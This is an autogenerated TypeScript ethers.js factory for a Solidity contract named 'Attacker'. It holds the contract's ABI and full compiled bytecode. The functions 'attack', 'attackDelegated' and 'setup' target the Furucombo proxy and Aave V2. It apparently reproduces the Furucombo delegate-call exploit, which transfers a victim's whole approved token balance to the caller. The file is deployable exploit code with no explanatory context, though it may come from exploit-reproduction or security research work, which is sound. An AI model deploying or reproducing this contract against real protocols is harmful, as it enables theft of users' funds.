/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */

import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Attacker, AttackerInterface } from "../Attacker";

const _abi = [
  {
    inputs: [],
    name: "AAVE_V2_PROXY",
    outputs: [
      {
        internalType: "contract IAaveV2Proxy",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "FURUCOMBO",
    outputs: [
      {
        internalType: "contract IProxy",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "contract IERC20",
        name: "token",
        type: "address",
      },
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
    ],
    name: "attack",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "contract IERC20",
        name: "token",
        type: "address",
      },
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
    ],
    name: "attackDelegated",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "setup",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b50610e54806100206000396000f3fe60806040526004361061004a5760003560e01c80633c48664c1461004f5780636afbdfaf1461006b5780636bfc21dc14610096578063b90e6a75146100b2578063ba0bba40146100dd575b600080fd5b610069600480360381019061006491906107b6565b6100e7565b005b34801561007757600080fd5b5061008061035a565b60405161008d9190610855565b60405180910390f35b6100b060048036038101906100ab91906107b6565b610372565b005b3480156100be57600080fd5b506100c761048e565b6040516100d49190610891565b60405180910390f35b6100e56104a6565b005b6000600167ffffffffffffffff811115610104576101036108ac565b5b6040519080825280602002602001820160405280156101325781602001602082028036833780820191505090505b5090506000600167ffffffffffffffff811115610152576101516108ac565b5b6040519080825280602002602001820160405280156101805781602001602082028036833780820191505090505b5090506000600167ffffffffffffffff8111156101a05761019f6108ac565b5b6040519080825280602002602001820160405280156101d357816020015b60608152602001906001900390816101be5790505b509050737d2768de32b0b80b7a3454c06bdac94a69ddc7a9836000815181106101ff576101fe6108db565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050636bfc21dc60e01b858560405160240161025492919061093a565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050816000815181106102c5576102c46108db565b5b60200260200101819052507317e8ca1b4798b97602895f63206afcd1fc90ca5f73ffffffffffffffffffffffffffffffffffffffff166338c5c08e8484846040518463ffffffff1660e01b815260040161032193929190610c44565b600060405180830381600087803b15801561033b57600080fd5b505af115801561034f573d6000803e3d6000fd5b505050505050505050565b737d2768de32b0b80b7a3454c06bdac94a69ddc7a981565b8173ffffffffffffffffffffffffffffffffffffffff166323b872dd82328573ffffffffffffffffffffffffffffffffffffffff166370a08231866040518263ffffffff1660e01b81526004016103c99190610c90565b60206040518083038186803b1580156103e157600080fd5b505afa1580156103f5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104199190610ce1565b6040518463ffffffff1660e01b815260040161043793929190610d1d565b602060405180830381600087803b15801561045157600080fd5b505af1158015610465573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104899190610d8c565b505050565b7317e8ca1b4798b97602895f63206afcd1fc90ca5f81565b6000600167ffffffffffffffff8111156104c3576104c26108ac565b5b6040519080825280602002602001820160405280156104f15781602001602082028036833780820191505090505b5090506000600167ffffffffffffffff811115610511576105106108ac565b5b60405190808252806020026020018201604052801561053f5781602001602082028036833780820191505090505b5090506000600167ffffffffffffffff81111561055f5761055e6108ac565b5b60405190808252806020026020018201604052801561059257816020015b606081526020019060019003908161057d5790505b509050737d2768de32b0b80b7a3454c06bdac94a69ddc7a9836000815181106105be576105bd6108db565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505063d1f5789460e01b306040516024016106119190610df0565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505081600081518110610682576106816108db565b5b60200260200101819052507317e8ca1b4798b97602895f63206afcd1fc90ca5f73ffffffffffffffffffffffffffffffffffffffff166338c5c08e8484846040518463ffffffff1660e01b81526004016106de93929190610c44565b600060405180830381600087803b1580156106f857600080fd5b505af115801561070c573d6000803e3d6000fd5b50505050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006107458261071a565b9050919050565b60006107578261073a565b9050919050565b6107678161074c565b811461077257600080fd5b50565b6000813590506107848161075e565b92915050565b6107938161073a565b811461079e57600080fd5b50565b6000813590506107b08161078a565b92915050565b600080604083850312156107cd576107cc610715565b5b60006107db85828601610775565b92505060206107ec858286016107a1565b9150509250929050565b6000819050919050565b600061081b6108166108118461071a565b6107f6565b61071a565b9050919050565b600061082d82610800565b9050919050565b600061083f82610822565b9050919050565b61084f81610834565b82525050565b600060208201905061086a6000830184610846565b92915050565b600061087b82610822565b9050919050565b61088b81610870565b82525050565b60006020820190506108a66000830184610882565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600061091582610822565b9050919050565b6109258161090a565b82525050565b6109348161073a565b82525050565b600060408201905061094f600083018561091c565b61095c602083018461092b565b9392505050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6109988161073a565b82525050565b60006109aa838361098f565b60208301905092915050565b6000602082019050919050565b60006109ce82610963565b6109d8818561096e565b93506109e38361097f565b8060005b83811015610a145781516109fb888261099e565b9750610a06836109b6565b9250506001810190506109e7565b5085935050505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b610a6081610a4d565b82525050565b6000610a728383610a57565b60208301905092915050565b6000602082019050919050565b6000610a9682610a21565b610aa08185610a2c565b9350610aab83610a3d565b8060005b83811015610adc578151610ac38882610a66565b9750610ace83610a7e565b925050600181019050610aaf565b5085935050505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610b4f578082015181840152602081019050610b34565b83811115610b5e576000848401525b50505050565b6000601f19601f8301169050919050565b6000610b8082610b15565b610b8a8185610b20565b9350610b9a818560208601610b31565b610ba381610b64565b840191505092915050565b6000610bba8383610b75565b905092915050565b6000602082019050919050565b6000610bda82610ae9565b610be48185610af4565b935083602082028501610bf685610b05565b8060005b85811015610c325784840389528151610c138582610bae565b9450610c1e83610bc2565b925060208a01995050600181019050610bfa565b50829750879550505050505092915050565b60006060820190508181036000830152610c5e81866109c3565b90508181036020830152610c728185610a8b565b90508181036040830152610c868184610bcf565b9050949350505050565b6000602082019050610ca5600083018461092b565b92915050565b6000819050919050565b610cbe81610cab565b8114610cc957600080fd5b50565b600081519050610cdb81610cb5565b92915050565b600060208284031215610cf757610cf6610715565b5b6000610d0584828501610ccc565b91505092915050565b610d1781610cab565b82525050565b6000606082019050610d32600083018661092b565b610d3f602083018561092b565b610d4c6040830184610d0e565b949350505050565b60008115159050919050565b610d6981610d54565b8114610d7457600080fd5b50565b600081519050610d8681610d60565b92915050565b600060208284031215610da257610da1610715565b5b6000610db084828501610d77565b91505092915050565b600082825260208201905092915050565b50565b6000610dda600083610db9565b9150610de582610dca565b600082019050919050565b6000604082019050610e05600083018461092b565b8181036020830152610e1681610dcd565b90509291505056fea2646970667358221220f3e8e7b7b55dee50d4fbbb4a8461c80ee2c50dc612783355b4dd7f1d24430c0b64736f6c63430008090033";

export class Attacker__factory extends ContractFactory {
  constructor(
    ...args: [signer: Signer] | ConstructorParameters<typeof ContractFactory>
  ) {
    if (args.length === 1) {
      super(_abi, _bytecode, args[0]);
    } else {
      super(...args);
    }
  }

  deploy(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Attacker> {
    return super.deploy(overrides || {}) as Promise<Attacker>;
  }
  getDeployTransaction(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(overrides || {});
  }
  attach(address: string): Attacker {
    return super.attach(address) as Attacker;
  }
  connect(signer: Signer): Attacker__factory {
    return super.connect(signer) as Attacker__factory;
  }
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackerInterface {
    return new utils.Interface(_abi) as AttackerInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): Attacker {
    return new Contract(address, _abi, signerOrProvider) as Attacker;
  }
}
